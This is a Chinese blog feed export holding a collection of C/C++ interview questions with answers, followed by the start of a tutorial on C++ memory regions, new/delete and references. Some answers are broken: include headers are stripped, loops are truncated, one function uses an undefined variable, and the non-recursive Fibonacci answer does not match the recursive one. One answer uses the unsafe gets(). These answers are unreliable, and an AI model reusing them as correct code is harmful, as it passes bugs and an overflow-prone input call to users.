azhen<br>#include<br>#include<br>#include<br>char *commanstring(char shortstring[], char longstring[])<br>{<br>int i, j;<br>char *substring=malloc(256);<br>if(strstr(longstring, shortstring)!=NULL) //如果……，那么返回 shortstring<br>return shortstring;<br>for(i=strlen(shortstring)-1;i&gt;0; i–) //否则，开始循环计算<br>{<br>for(j=0; j&lt;=strlen(shortstring)-i; j++){<br>memcpy(substring, &amp;shortstring[j], i);<br>substring[i]=’\0’;<br>if(strstr(longstring, substring)!=NULL)<br>return substring;<br>}<br>}<br>return NULL;<br>}<br>main()<br>{<br>char *str1=malloc(256);<br>char *str2=malloc(256);<br>char *comman=NULL;<br>gets(str1);<br>gets(str2);<br>if(strlen(str1)&gt;strlen(str2)) //将短的字符串放前面<br>comman=commanstring(str2, str1);<br>else<br>comman=commanstring(str1, str2);<br>printf(“the longest comman string is: %s\n”, comman);<br>}<br>28、写一个函数比较两个字符串 str1和 str2的大小，若相等返回0，若 str1大于<br>str2返回1，若 str1小于 str2返回－1<br>int strcmp ( const char * src,const char * dst)<br>{<br>int ret = 0 ;<br>while( ! (ret = *(unsigned char *)src – *(unsigned char *)dst) &amp;&amp; *dst)<br>{<br>++src;<br>++dst;<br>}<br>if ( ret &lt; 0 )<br>ret = -1 ;<br>else if ( ret &gt; 0 )<br>ret = 1 ;<br>return( ret );<br>}<br>29、求1000！的未尾有几个0（用素数相乘的方法来做，如72=2</em>2<em>2</em>3<em>3）;<br>求出1-&gt;1000里,能被5整除的数的个数 n1,能被25整除的数的个数 n2,能被125整除的数的个数<br>n3,<br>能被625整除的数的个数 n4.<br>1000!末尾的零的个数=n1+n2+n3+n4;<br>#include<br>#define NUM 1000<br>int find5(int num){<br>int ret=0;<br>while(num%5==0){<br>num/=5;<br>ret++;<br>}<br>return ret;<br>}<br>int main(){<br>int result=0;<br>int i;<br>for(i=5;i&lt;=NUM;i+=5)<br>{<br>result+=find5(i);<br>}<br>printf(“ the total zero number is %d\n”,result);<br>return 0;<br>}<br>30、有双向循环链表结点定义为：<br>struct node<br>{ int data;<br>struct node *front,*next;<br>};<br>有两个双向循环链表 A，B，知道其头指针为：pHeadA,pHeadB，请写一函数将两链表中 data<br>值相同的结点删除<br>BOOL DeteleNode(Node *pHeader, DataType Value)<br>{<br>if (pHeader == NULL) return;<br>BOOL bRet = FALSE;<br>Node *pNode = pHead;<br>while (pNode != NULL)<br>{<br>if (pNode-&gt;data == Value)<br>{<br>if (pNode-&gt;front == NULL)<br>{<br>pHeader = pNode-&gt;next;<br>pHeader-&gt;front = NULL;<br>}<br>else<br>{<br>if (pNode-&gt;next != NULL)<br>{<br>pNode-&gt;next-&gt;front = pNode-&gt;front;<br>}<br>pNode-&gt;front-&gt;next = pNode-&gt;next;<br>}<br>Node *pNextNode = pNode-&gt;next;<br>delete pNode;<br>pNode = pNextNode;<br>bRet = TRUE;<br>//不要 break 或 return, 删除所有<br>}<br>else<br>{<br>pNode = pNode-&gt;next;<br>}<br>}<br>return bRet;<br>}<br>void DE(Node *pHeadA, Node *pHeadB)<br>{<br>if (pHeadA == NULL || pHeadB == NULL)<br>{<br>return;<br>}<br>Node *pNode = pHeadA;<br>while (pNode != NULL)<br>{<br>if (DeteleNode(pHeadB, pNode-&gt;data))<br>{<br>if (pNode-&gt;front == NULL)<br>{<br>pHeadA = pNode-&gt;next;<br>pHeadA-&gt;front = NULL;<br>}<br>else<br>{<br>pNode-&gt;front-&gt;next = pNode-&gt;next;<br>if (pNode-&gt;next != NULL)<br>{<br>pNode-&gt;next-&gt;front = pNode-&gt;front;<br>}<br>}<br>Node *pNextNode = pNode-&gt;next;<br>delete pNode;<br>pNode = pNextNode;<br>}<br>else<br>{<br>pNode = pNode-&gt;next;<br>}<br>}<br>}<br>31、编程实现：找出两个字符串中最大公共子字符串,如”abccade”,”dgcadde”的最大子串<br>为”cad”<br>int GetCommon(char *s1, char *s2, char *</em>r1, char *<em>r2)<br>{<br>int len1 = strlen(s1);<br>int len2 = strlen(s2);<br>int maxlen = 0;<br>for(int i = 0; i &lt; len1; i++)<br>{<br>for(int j = 0; j &lt; len2; j++)<br>{<br>if(s1[i] == s2[j])<br>{<br>int as = i, bs = j, count = 1;<br>while(as + 1 &lt; len1 &amp;&amp; bs + 1 &lt; len2 &amp;&amp; s1[++as] == s2[++bs])<br>count++;<br>if(count &gt; maxlen)<br>{<br>maxlen = count;<br>*r1 = s1 + i;<br>*r2 = s2 + j;<br>}<br>}<br>}<br>}<br>32、编程实现：把十进制数(long 型)分别以二进制和十六进制形式输出，不能使用 printf 系<br>列库函数<br>char</em> test3(long num) {<br>char* buffer = (char*)malloc(11);<br>buffer[0] = ’0′;<br>buffer[1] = ‘x’;<br>buffer[10] = ‘\0′;<br>char* temp = buffer + 2;<br>for (int i=0; i &lt; 8; i++) {<br>temp[i] = (char)(num&lt;&lt;4*i&gt;&gt;28);<br>temp[i] = temp[i] &gt;= 0 ? temp[i] : temp[i] + 16;<br>temp[i] = temp[i] &lt; 10 ? temp[i] + 48 : temp[i] + 55;<br>}<br>return buffer;<br>}<br>33、输入 N, 打印 N*N 矩阵<br>比如 N = 3，打印：<br>1 2 3<br>8 9 4<br>7 6 5<br>N = 4，打印：<br>1 2 3 4<br>12 13 14 5<br>11 16 15 6<br>10 9 8 7<br>解答：<br>1 #define N 15<br>int s[N][N];<br>void main()<br>{<br>int k = 0, i = 0, j = 0;<br>int a = 1;<br>for( ; k &lt; (N+1)/2; k++ )<br>{<br>while( j &lt; N-k ) s[i][j++] = a++; i++; j–;<br>while( i &lt; N-k ) s[i++][j] = a++; i–; j–;<br>while( j &gt; k-1 ) s[i][j–] = a++; i–; j++;<br>while( i &gt; k ) s[i–][j] = a++; i++; j++;<br>}<br>for( i = 0; i &lt; N; i++ )<br>{<br>for( j = 0; j &lt; N; j++ )<br>cout &lt;&lt; s[i][j] &lt;&lt; ‘\t’;<br>cout &lt;&lt; endl;<br>}<br>}<br>2 define MAX_N 100<br>int matrix[MAX_N][MAX_N];<br>/*<br>*（x,y）：第一个元素的坐标</p><ul><li>start：第一个元素的值</li><li>n：矩阵的大小</li><li>/<br>void SetMatrix(int x, int y, int start, int n) {<br>int i, j;<br>if (n &lt;= 0) //递归结束条件<br>return;<br>if (n == 1) { //矩阵大小为1时<br>matrix[x][y] = start;<br>return;<br>}<br>for (i = x; i &lt; x + n-1; i++) //矩阵上部<br>matrix[y][i] = start++;<br>for (j = y; j &lt; y + n-1; j++) //右部<br>matrix[j][x+n-1] = start++;<br>for (i = x+n-1; i &gt; x; i–) //底部<br>matrix[y+n-1][i] = start++;<br>for (j = y+n-1; j &gt; y; j–) //左部<br>matrix[j][x] = start++;<br>SetMatrix(x+1, y+1, start, n-2); //递归<br>}<br>void main() {<br>int i, j;<br>int n;<br>scanf(“%d”, &amp;n);<br>SetMatrix(0, 0, 1, n);<br>//打印螺旋矩阵<br>for(i = 0; i &lt; n; i++) {<br>for (j = 0; j &lt; n; j++)<br>printf(“%4d”, matrix[i][j]);<br>printf(“\n”);<br>}<br>}<br>34、斐波拉契数列递归实现的方法如下：<br>int Funct( int n )<br>{<br>if(n==0) return 1;<br>if(n==1) return 1;<br>retrurn Funct(n-1) + Funct(n-2);<br>}<br>请问，如何不使用递归，来实现上述函数？<br>请教各位高手！<br>解答：int Funct( int n ) // n 为非负整数<br>{<br>int a=0;<br>int b=1;<br>int c;<br>if(n==0) c=1;<br>else if(n==1) c=1;<br>else for(int i=2;i&lt;=n;i++) //应该 n 从2开始算起<br>{<br>c=a+b;<br>a=b;<br>b=c;<br>}<br>return c;<br>}<br>解答：<br>现在大多数系统都是将低字位放在前面，而结构体中位域的申明一般是先声明高位。<br>100 的二进制是 001 100 100<br>低位在前 高位在后<br>001—-s3<br>100—-s2<br>100—-s1<br>所以结果应该是 1<br>如果先申明的在低位则：<br>001—-s1<br>100—-s2<br>100—-s3<br>结果是 4<br>1、原题跟 little-endian，big-endian 没有关系<br>2、原题跟位域的存储空间分配有关，到底是从低字节分配还是从高字节分配，从 Dev C++<br>和 VC7.1上看，都是从低字节开始分配，并且连续分配，中间不空，不像谭的书那样会留空<br>位<br>3、原题跟编译器有关，编译器在未用堆栈空间的默认值分配上有所不同，Dev C++未用空<br>间分配为<br>01110111b，VC7.1下为11001100b,所以在 Dev C++下的结果为5，在 VC7.1下为1。<br>注：PC 一般采用 little-endian，即高高低低，但在网络传输上，一般采用 big-endian，即高<br>低低高，华为是做网络的，所以可能考虑 big-endian 模式，这样输出结果可能为4<br>35、判断一个字符串是不是回文<br>int IsReverseStr(char <em>aStr)<br>{<br>int i,j;<br>int found=1;<br>if(aStr==NULL)<br>return -1;<br>j=strlen(aStr);<br>for(i=0;i<br>if(</em>(aStr+i)!=*(aStr+j-i-1))<br>{<br>found=0;<br>break;<br>}<br>return found;<br>}<br>36、Josephu 问题为：设编号为1，2，… n 的 n 个人围坐一圈，约定编号为 k（1&lt;=k&lt;=n）<br>的人从1开始报数，数到 m 的那个人出列，它的下一位又从1开始报数，数到 m 的那个人又<br>出列，依次类推，直到所有人出列为止，由此产生一个出队编号的序列。<br>数组实现：<br>#include<br>#include<br>int Josephu(int n, int m)<br>{<br>int flag, i, j = 0;<br>int *arr = (int *)malloc(n * sizeof(int));<br>for (i = 0; i &lt; n; ++i)<br>arr[i] = 1;<br>for (i = 1; i &lt; n; ++i)<br>{<br>flag = 0;<br>while (flag &lt; m)<br>{<br>if (j == n)<br>j = 0;<br>if (arr[j])</li></ul><p>++flag;<br>++j;<br>}<br>arr[j - 1] = 0;<br>printf(“第%4d 个出局的人是：%4d 号\n”, i, j);<br>}<br>free(arr);<br>return j;<br>}<br>int main()<br>{<br>int n, m;<br>scanf(“%d%d”, &amp;n, &amp;m);<br>printf(“最后胜利的是%d 号！\n”, Josephu(n, m));<br>system(“pause”);<br>return 0;<br>}<br>链表实现：<br>#include<br>#include<br>typedef struct Node<br>{<br>int index;<br>struct Node *next;<br>}JosephuNode;<br>int Josephu(int n, int m)<br>{<br>int i, j;<br>JosephuNode *head, *tail;<br>head = tail = (JosephuNode *)malloc(sizeof(JosephuNode));<br>for (i = 1; i &lt; n; ++i)<br>{<br>tail-&gt;index = i;<br>tail-&gt;next = (JosephuNode *)malloc(sizeof(JosephuNode));<br>tail = tail-&gt;next;<br>}<br>tail-&gt;index = i;<br>tail-&gt;next = head;<br>for (i = 1; tail != head; ++i)<br>{<br>for (j = 1; j &lt; m; ++j)<br>{<br>tail = head;<br>head = head-&gt;next;<br>}<br>tail-&gt;next = head-&gt;next;<br>printf(“第%4d 个出局的人是：%4d 号\n”, i, head-&gt;index);<br>free(head);<br>head = tail-&gt;next;<br>}<br>i = head-&gt;index;<br>free(head);<br>return i;<br>}<br>int main()<br>{<br>int n, m;<br>scanf(“%d%d”, &amp;n, &amp;m);<br>printf(“最后胜利的是%d 号！\n”, Josephu(n, m));<br>system(“pause”);<br>return 0;<br>}<br>37、已知 strcpy 函数的原型是：<br>char * strcpy(char * strDest,const char * strSrc);<br>1.不调用库函数，实现 strcpy 函数。<br>2.解释为什么要返回 char *。<br>解说：<br>1.strcpy 的实现代码<br>char * strcpy(char * strDest,const char * strSrc)<br>{<br>if ((strDest==NULL)||(strSrc==NULL)) file://[/1]<br>throw “Invalid argument(s)”; //[2]<br>char * strDestCopy=strDest; file://[/3]<br>while ((*strDest++=*strSrc++)!=’\0′); file://[/4]<br>return strDestCopy;<br>}<br>错误的做法：<br>[1]<br>(A)不检查指针的有效性，说明答题者不注重代码的健壮性。<br>(B)检查指针的有效性时使用((!strDest)||(!strSrc))或(!(strDest&amp;&amp;strSrc))，说明答题者对 C 语<br>言中类型的隐式转换没有深刻认识。在本例中 char *转换为 bool 即是类型隐式转换，这种功<br>能虽然灵活，但更多的是导致出错概率增大和维护成本升高。所以 C++专门增加了 bool、true、<br>false 三个关键字以提供更安全的条件表达式。<br>(C)检查指针的有效性时使用((strDest==0)||(strSrc==0))，说明答题者不知道使用常量的好处。<br>直接使用字面常量（如本例中的0）会减少程序的可维护性。0虽然简单，但程序中可能出现<br>很多处对指针的检查，万一出现笔误，编译器不能发现，生成的程序内含逻辑错误，很难排<br>除。而使用 NULL 代替0，如果出现拼写错误，编译器就会检查出来。<br>[2]<br>(A)return new string(“Invalid argument(s)”);，说明答题者根本不知道返回值的用途，并且他对<br>内存泄漏也没有警惕心。从函数中返回函数体内分配的内存是十分危险的做法，他把释放内<br>存的义务抛给不知情的调用者，绝大多数情况下，调用者不会释放内存，这导致内存泄漏。<br>(B)return 0;，说明答题者没有掌握异常机制。调用者有可能忘记检查返回值，调用者还可能<br>无法检查返回值（见后面的链式表达式）。妄想让返回值肩负返回正确值和异常值的双重功<br>能，其结果往往是两种功能都失效。应该以抛出异常来代替返回值，这样可以减轻调用者的<br>负担、使错误不会被忽略、增强程序的可维护性。<br>[3]<br>(A)忘记保存原始的 strDest 值，说明答题者逻辑思维不严密。<br>[4]<br>(A)循环写成 while (*strDest++=*strSrc++);，同<a href="B">1</a>。<br>(B)循环写成 while (*strSrc!=’\0′) *strDest++=*strSrc++;，说明答题者对边界条件的检查不力。<br>循环体结束后，strDest 字符串的末尾没有正确地加上’\0′。<br>第四部分：附加部分<br>1、位域 ：<br>有些信息在存储时，并不需要占用一个完整的字节， 而只需占几个或一个二进制位。例如<br>在存放一个开关量时，只有0和1 两种状态， 用一位二进位即可。为了节省存储空间，并使<br>处理简便，Ｃ语言又提供了一种数据结构，称为“位域”或“位段”。所谓“位域”是把一个字节<br>中的二进位划分为几个不同的区域， 并说明每个区域的位数。每个域有一个域名，允许在<br>程序中按域名进行操作。 这样就可以把几个不同的对象用一个字节的二进制位域来表示。<br>一、位域的定义和位域变量的说明位域定义与结构定义相仿，其形式为：<br>struct 位域结构名<br>{ 位域列表 };<br>其中位域列表的形式为： 类型说明符 位域名：位域长度<br>例如：<br>struct bs<br>{<br>int a:8;<br>int b:2;<br>int c:6;<br>};<br>位域变量的说明与结构变量说明的方式相同。 可采用先定义后说明，同时定义说明或者直<br>接说明这三种方式。例如：<br>struct bs<br>{<br>int a:8;<br>int b:2;<br>int c:6;<br>}data;<br>说明 data 为 bs 变量，共占两个字节。其中位域 a 占8位，位域 b 占2位，位域 c 占6位。对于<br>位域的定义尚有以下几点说明：</p><ol><li>一个位域必须存储在同一个字节中，不能跨两个字节。如一个字节所剩空间不够存放另<br>一位域时，应从下一单元起存放该位域。也可以有意使某位域从下一单元开始。例如：<br>struct bs<br>{<br>unsigned a:4<br>unsigned :0 /<em>空域</em>/<br>unsigned b:4 /<em>从下一单元开始存放</em>/<br>unsigned c:4<br>}<br>在这个位域定义中，a 占第一字节的4位，后4位填0表示不使用，b 从第二字节开始，占用4<br>位，c 占用4位。</li><li>由于位域不允许跨两个字节，因此位域的长度不能大于一个字节的长度，也就是说不能<br>超过8位二进位。</li><li>位域可以无位域名，这时它只用来作填充或调整位置。无名的位域是不能使用的。例如：<br>struct k<br>{<br>int a:1<br>int :2 /<em>该2位不能使用</em>/<br>int b:3<br>int c:2<br>};<br>从以上分析可以看出，位域在本质上就是一种结构类型， 不过其成员是按二进位分配的。<br>二、位域的使用位域的使用和结构成员的使用相同，其一般形式为： 位域变量名•位域名 位<br>域允许用各种格式输出。<br>main(){<br>struct bs<br>{<br>unsigned a:1;<br>unsigned b:3;<br>unsigned c:4;<br>} bit,*pbit;<br>bit.a=1;<br>bit.b=7;<br>bit.c=15;<br>pri<br>改错：<br>#include<br>int main(void) {<br>int **p;<br>int arr[100];<br>p = &arr;<br>return 0;<br>}<br>解答：<br>搞错了,是指针类型不同,<br>int **p; //二级指针<br>&arr; //得到的是指向第一维为100的数组的指针<br>#include<br>int main(void) {<br>int **p, *q;<br>int arr[100];<br>q = arr;<br>p = &q;<br>return 0;<br>}</li></ol>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++核心编程</title>
      <link href="2020/12/05/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
      <url>2020/12/05/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本阶段主要针对C++==面向对象==编程技术做详细讲解，探讨C++中的核心和精髓。</p><h1 id="内存分区模型"><a href="#内存分区模型" class="headerlink" title="内存分区模型"></a>内存分区模型</h1><p>C++程序在执行时，将内存大方向划分为<strong>4个区域</strong></p><ul><li>代码区：存放函数体的二进制代码，由操作系统进行管理的</li><li>全局区：存放全局变量和静态变量以及常量</li><li>栈区：由编译器自动分配释放, 存放函数的参数值,局部变量等</li><li>堆区：由程序员分配和释放,若程序员不释放,程序结束时由操作系统回收</li></ul><p><strong>内存四区意义：</strong></p><p>不同区域存放的数据，赋予不同的生命周期, 给我们更大的灵活编程</p><h2 id="程序运行前"><a href="#程序运行前" class="headerlink" title="程序运行前"></a>程序运行前</h2><p> 在程序编译后，生成了exe可执行程序，<strong>未执行该程序前</strong>分为两个区域</p><p> <strong>代码区：</strong></p><p> 存放 CPU 执行的机器指令</p><p> 代码区是<strong>共享</strong>的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可</p><p> 代码区是<strong>只读</strong>的，使其只读的原因是防止程序意外地修改了它的指令</p><p> <strong>全局区：</strong></p><p> 全局变量和静态变量存放在此.</p><p> 全局区还包含了常量区, 字符串常量和其他常量也存放在此.</p><p> ==该区域的数据在程序结束后由操作系统释放==.</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;全局变量</span><br><span class="line">int g_a &#x3D; 10;</span><br><span class="line">int g_b &#x3D; 10;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;全局常量</span><br><span class="line">const int c_g_a &#x3D; 10;</span><br><span class="line">const int c_g_b &#x3D; 10;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;局部变量</span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">int b &#x3D; 10;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;打印地址</span><br><span class="line">cout &lt;&lt; &quot;局部变量a地址为： &quot; &lt;&lt; (int)&amp;a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;局部变量b地址为： &quot; &lt;&lt; (int)&amp;b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;全局变量g_a地址为： &quot; &lt;&lt;  (int)&amp;g_a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;全局变量g_b地址为： &quot; &lt;&lt;  (int)&amp;g_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态变量</span><br><span class="line">static int s_a &#x3D; 10;</span><br><span class="line">static int s_b &#x3D; 10;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;静态变量s_a地址为： &quot; &lt;&lt; (int)&amp;s_a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;静态变量s_b地址为： &quot; &lt;&lt; (int)&amp;s_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;字符串常量地址为： &quot; &lt;&lt; (int)&amp;&quot;hello world&quot; &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;字符串常量地址为： &quot; &lt;&lt; (int)&amp;&quot;hello world1&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;全局常量c_g_a地址为： &quot; &lt;&lt; (int)&amp;c_g_a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;全局常量c_g_b地址为： &quot; &lt;&lt; (int)&amp;c_g_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">const int c_l_a &#x3D; 10;</span><br><span class="line">const int c_l_b &#x3D; 10;</span><br><span class="line">cout &lt;&lt; &quot;局部常量c_l_a地址为： &quot; &lt;&lt; (int)&amp;c_l_a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;局部常量c_l_b地址为： &quot; &lt;&lt; (int)&amp;c_l_b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">局部变量a地址为： 8321264</span><br><span class="line">局部变量b地址为： 8321252</span><br><span class="line">全局变量g_a地址为： 10534912</span><br><span class="line">全局变量g_b地址为： 10534916</span><br><span class="line">静态变量s_a地址为： 10534920</span><br><span class="line">静态变量s_b地址为： 10534924</span><br><span class="line">字符串常量地址为： 10525684</span><br><span class="line">字符串常量地址为： 10525700</span><br><span class="line">全局常量c_g_a地址为： 10525488</span><br><span class="line">全局常量c_g_b地址为： 10525492</span><br><span class="line">局部常量c_l_a地址为： 8321240</span><br><span class="line">局部常量c_l_b地址为： 8321228</span><br><span class="line">请按任意键继续. . .</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>C++中在程序运行前分为全局区和代码区</li><li>代码区特点是共享和只读</li><li>全局区中存放全局变量、静态变量、常量</li><li>常量区中存放 const修饰的全局常量 和 字符串常量</li></ul><h2 id="程序运行后"><a href="#程序运行后" class="headerlink" title="程序运行后"></a>程序运行后</h2><p> <strong>栈区：</strong></p><p> 由编译器自动分配释放, 存放函数的参数值,局部变量等</p><p> 注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int * func()</span><br><span class="line">&#123;</span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">return &amp;a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int *p &#x3D; func();</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>堆区：</strong></p><p> 由程序员分配释放,若程序员不释放,程序结束时由操作系统回收</p><p> 在C++中主要利用new在堆区开辟内存</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int* func()</span><br><span class="line">&#123;</span><br><span class="line">int* a &#x3D; new int(10);</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int *p &#x3D; func();</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>堆区数据由程序员管理开辟和释放</p><p>堆区数据利用new关键字进行开辟内存</p><h2 id="new操作符"><a href="#new操作符" class="headerlink" title="new操作符"></a>new操作符</h2><p> C++中利用==new==操作符在堆区开辟数据</p><p> 堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符 ==delete==</p><p> 语法：<code> new 数据类型</code></p><p> 利用new创建的数据，会返回该数据对应的类型的指针</p><p><strong>示例1： 基本语法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int* func()</span><br><span class="line">&#123;</span><br><span class="line">int* a &#x3D; new int(10);</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int *p &#x3D; func();</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用delete释放堆区数据</span><br><span class="line">delete p;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; *p &lt;&lt; endl; &#x2F;&#x2F;报错，释放的空间不可访问</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例2：开辟数组</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;堆区开辟数组</span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int* arr &#x3D; new int[10];</span><br><span class="line"></span><br><span class="line">for (int i &#x3D; 0; i &lt; 10; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] &#x3D; i + 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (int i &#x3D; 0; i &lt; 10; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;释放数组 delete 后加 []</span><br><span class="line">delete[] arr;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><h2 id="引用的基本使用"><a href="#引用的基本使用" class="headerlink" title="引用的基本使用"></a>引用的基本使用</h2><p>**作用： **给变量起别名</p><p><strong>语法：</strong> <code>数据类型 &amp;别名 = 原名</code></p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">int &amp;b &#x3D; a;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;</span><br><span 